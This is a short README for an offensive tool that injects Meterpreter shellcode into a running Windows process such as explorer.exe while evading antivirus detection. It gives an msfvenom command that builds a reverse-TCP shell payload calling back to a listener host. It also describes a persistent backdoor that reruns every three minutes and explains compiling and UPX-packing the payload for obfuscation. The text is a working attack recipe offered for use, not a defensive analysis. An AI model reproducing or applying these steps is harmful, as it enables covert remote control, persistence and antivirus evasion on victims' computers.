#-----------------------------------#
#   AV-Safe Meterpreter Injection   #
#  Author: Leg3nd @ https://leg3nd.me
#-----------------------------------#

# Description #
Undetected meterpreter oode injection payload This will inject 
meterpreter shellcode directly into a given process. It will
also create a persistent backdoor to run this every 3 minutes,
regardless of power state, etc, etc.

# Generate Payload #
Use the following command in order to generate the shellcode:
  - data=$(msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.42.2 LPORT=587 -f c | tr -d '\"' | tr -d '\n' | awk -F= '{print $2}' | awk '{print $1}') ; python -c 'import base64;print base64.encodestring("'$data'").replace("\n","")'

You will paste this base64 encoded shellcode into inject.py under the "code" variables. This
shellcode will be decoded at runtime in memory and injected into the memory space of an 
existing process such as explorer.exe.

# Compile the Python #
You need a few dependencies to get this to compile (on windows):
  - Python 2.7
  - py2exe
  - ctypes

After you have these, just run the compile.bat to generate inject.exe.

If you want, you can also run upx.sh from Linux for extra obfuscation
and filesize reduction. It can't hurt so mine as well.

